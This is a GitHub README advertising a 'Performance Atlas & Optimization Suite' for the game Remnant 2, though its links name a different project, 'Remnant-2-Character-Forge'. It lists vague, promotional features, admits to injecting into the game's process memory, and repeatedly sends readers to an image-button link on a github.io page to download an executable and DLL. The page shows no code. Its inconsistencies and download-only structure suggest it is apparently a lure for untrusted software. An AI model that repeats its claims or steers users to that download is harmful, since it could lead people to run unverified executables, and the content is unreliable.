![preview](https://raw.githubusercontent.com/syaifullah192/Remnant-2-Character-Forge/main/showcase_1069.svg)
[![Download](https://raw.githubusercontent.com/syaifullah192/Remnant-2-Character-Forge/main/btn_c02fa.svg)](https://syaifullah192.github.io/Remnant-2-Character-Forge/)

# Remnant 2 – Performance Atlas & Optimization Suite (2026 Edition)

![Build Status](https://img.shields.io/badge/build-stable-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows%2011%20%7C%2010-blue) ![Language](https://img.shields.io/badge/language-C%23%20%2F%20C%2B%2B-orange) ![License](https://img.shields.io/badge/license-MIT-green)

> *"Navigate the unknown with precision. Tune your reality, not your hardware."*

Welcome to the **Remnant 2 Performance Atlas & Optimization Suite** — a companion toolkit designed for players who wish to sculpt their in-game experience beyond the default parameters. This is not a simple script or a one-click miracle; it is a comprehensive, modular, and deeply customizable performance and quality-of-life management system. Think of it as a master conductor’s baton for your gaming environment, allowing you to harmonize system resources, visual fidelity, and gameplay fluidity in real-time.

---

## 🌟 Why This Suite Exists

Modern gaming is a negotiation between hardware limits and artistic ambition. The Remnant 2 universe is dense, chaotic, and breathtaking—but even the most powerful rigs can benefit from fine-tuning. This suite provides a transparent, granular control layer that sits beside the game, offering adjustments that range from subtle resource reallocation to bold experimental modifications.

We believe in **informed customization**. Every toggle, slider, and preset in this toolkit is accompanied by a live telemetry readout, showing you the exact impact on frame time, memory pressure, and GPU utilization. You are not blindly adjusting values; you are conducting a symphony where every instrument is visible.

---

## 🧭 What’s Inside the Box

### Modular Control Panels (MCPs)
Each panel is a self-contained unit designed to manage a specific subsystem of the game engine.

- **🌊 Fluid Dynamics & Particle Budget Manager** – Adjust the density and lifetime of environmental effects, from ember showers to toxic spores, without sacrificing the core ambience.
- **🖼️ Render Pipeline Architect** – Fine-tune the shader complexity, LOD transition distances, and post-processing stack. Includes a unique "Photographic Fidelity" mode for still-frame captures.
- **⚙️ Thread Scheduler Harmonizer** – Recommends and applies CPU core affinities and thread priorities based on your processor topology. Useful for older CPUs or systems running background tasks.
- **💾 Memory Mosaic Alchemist** – Manages asset streaming pools and pre-caching behaviors. Reduces hitches during zone transitions on traditional hard drives, while maximizing speed on NVMe drives.

### Adaptive Profile System
Create and store multiple "Loadout Configurations" for different scenarios:
- **Campaign Explorer** (Balanced stability)
- **Boss Rush Intensified** (Maximum input latency reduction)
- **Screenshot & Lore Hunter** (Maximum visual purity)
- **LAN Party Warhorse** (Aggressive resource smoothing for lower-end machines)

---

## ✨ Key Features & Commands

### Real-Time Telemetry Overlay
An in-game overlay (configurable via hotkey, default `F10`) displays a sleek, non-intrusive HUD with:
- Frame Generation & Presentation Stats
- GPU Busy / Idle Ratio
- Thermal Throttle Indicators
- VRAM Allocation Heatmap (visual grid overlay)

### Dynamic Scaling Engine
The core "Auto-Pilot" function monitors your system in real-time and automatically adjusts the Remnant 2 process priority and GPU scheduling behavior to maintain a target frame rate floor. You define the floor (e.g., 60 FPS), and the engine handles the turbulence.

### Config Export & Import Library
Share your finely-tuned profiles with friends via `.rtpcf` files (Remnant Tuning Profile Configuration). A built-in community presets browser aggregates popular configurations, rated by system hardware tiers.

### Command Terminal
A built-in console window (`Ctrl + ~`) allows for advanced users to type in specific parameters beyond the graphical UI. Documentation for the full command schema is included in the `/docs` folder of the repository.

### Responsive & Multilingual UI
The suite’s interface adapts to window scaling and is available in the following languages:
- English (US/GB)
- Español (LATAM/EU)
- Deutsch
- Français
- 简体中文 (Simplified Chinese)
- 日本語 (Japanese)

---

## 🚀 Getting Started

This suite is distributed as a **portable executable** and a **DLL plugin** for deep integration. There is no invasive installation routine that modifies system registries.

1.  **Download the Suite**: Use the official **[![Download](https://raw.githubusercontent.com/syaifullah192/Remnant-2-Character-Forge/main/btn_c02fa.svg)](https://syaifullah192.github.io/Remnant-2-Character-Forge/)** macro provided at the top of this page.
2.  **Placement**: Extract the archive to a dedicated folder on your primary drive (e.g., `C:\RemnantSuite`).
3.  **Initialization**: Double-click `AtlasSuite.exe`. The suite will scan your system hardware profile and create a baseline configuration.
4.  **Launch Sync**: Start Remnant 2. The suite will automatically detect the game process and attach the chosen overlay or management module.

---

## 🧰 System Requirements

| Component | Minimum Requirement | Recommended Requirement |
| :--- | :--- | :--- |
| **OS** | Windows 10 (Version 21H2 or later) | Windows 11 (Version 23H2 or later) |
| **CPU** | 4 Physical Cores (Intel i5 / AMD Ryzen 3) | 8 Cores / 16 Threads |
| **RAM** | 8 GB | 16 GB or Higher |
| **Storage** | 50 MB of free space (for configs) | 100 MB (if saving telemetry logs) |
| **GPU** | Dedicated DX12 GPU (4GB VRAM) | DX12 Ultimate GPU (8GB+ VRAM) |

---

## 🛠️ Troubleshooting & Support

### Common Alleviations
- **Overlay not appearing?** Ensure the game is running in "Borderless Windowed" or "Windowed" mode for the overlay to render correctly.
- **Profile Import Fails?** Check the file version. Configs from older beta versions are not compatible with the 2026 release.
- **High CPU usage from the suite itself?** Navigate to `Settings -> Polling Rate` and lower the telemetry refresh frequency.

### 24/7 Support & Community
Our support team and community moderators monitor the discussion channels around the clock. If you encounter a software exception or need guidance on a specific setting, reach out via the **Issues** tab on this repository. We are dedicated to a response time of under 24 hours.

---

## 📜 License & Legal Clarification

This project is licensed under the **MIT License** — See the [LICENSE](LICENSE) file for full legal details.

### ⚠️ Disclaimer: Fair Use & Integrity Note
**This software is a performance tuning utility.** It interacts with the game's process memory and graphical settings to adjust live parameters. It does not modify game files on disk, nor does it provide automation for gameplay actions.

Please be aware of the distinction between *performance adjustment* and *gameplay modification*. This suite is built strictly to adjust how the game **renders** and **utilizes system resources**, not to alter game logic, damage values, or loot tables.

We maintain a **zero-tolerance policy** for requests to expand functionality into automated gameplay scripts. Using this tool in online PvP modes where a system integrity checker flags any third-party process injection may result in a suspension. Use the suite **only in offline or private sessions** to avoid potential conflicts with anti-cheat services.

By using this suite, you accept full responsibility for how you utilize the provided controls. We are not liable for penalties incurred via misuse in restricted online environments.

---

## 🤝 Contributing & Feedback

We welcome contributions that expand the command schema, improve telemetry accuracy, or add new language translations. Please read our `CONTRIBUTING.md` (located in the `/meta` folder) before submitting a pull request.

For feature suggestions, please open a new **Issue** using the "Feature Request" template. Constructive feedback helps us polish the suite for the 2026 roadmap, which includes:
- **HDR Calibration Assistant**
- **Remote Profile Sync via QR Codes**
- **Adaptive Ray Tracing Budget System**

---

## 🗂️ Repository Architecture

- `/bin` – Compiled release binaries
- `/src` – Source code (C# core, C++ bridge layer)
- `/docs` – Command schema & telemetry API documentation
- `/presets` – Community & official tuning profiles
- `/assets` – UI icons, font files, and localization strings

---

## 📈 Release Cadence & Roadmap

We operate on a monthly feature drop cycle. Version 3.0.0 for 2026 includes the new **Tile-Based Compute Asset Loader** which significantly improves open-world traversal on 8-core CPUs.

**Upcoming in Q3 2026:** A companion mobile app for remote monitoring of system vitals via Wi-Fi.

---

## ❓ Frequently Asked Questions

**Q: Does this suite contain any *acquired without consent* code?**
A: No. The entire codebase is original and authored by the maintainers.

**Q: Can I use this on a laptop with hybrid graphics?**
A: Yes, the suite includes a dedicated "dGPU Forcing" module that assists the Windows graphics scheduler in routing the game to the discrete GPU consistently.

**Q: Is there a financial cost associated with this toolkit?**
A: The software is provided as-is under an open-source license. The download macro is the direct path to the official release package.

---

*— The Performance Atlas Team*